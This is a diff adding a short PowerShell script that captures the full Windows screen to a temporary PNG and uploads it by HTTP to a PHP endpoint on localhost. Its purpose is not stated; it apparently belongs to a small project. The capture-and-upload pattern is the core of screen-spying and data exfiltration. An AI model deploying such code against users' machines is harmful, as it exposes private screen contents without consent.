@@ -1,0 +1,10 @@
+Add-Type -AssemblyName System.Windows.Forms
+Add-type -AssemblyName System.Drawing
+$File = "$env:TEMP\ScreenCapture.png"
+$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
+$bitmap = New-Object System.Drawing.Bitmap $Screen.Width,$Screen.Height
+$graphic = [System.Drawing.Graphics]::FromImage($bitmap)
+$graphic.CopyFromScreen(0, 0, 0, 0, $bitmap.Size)
+$bitmap.Save($File)
+$wc = New-Object System.Net.WebClient
+$resp = $wc.UploadFile("http://localhost/project/pc_to_server_upload.php", $File)
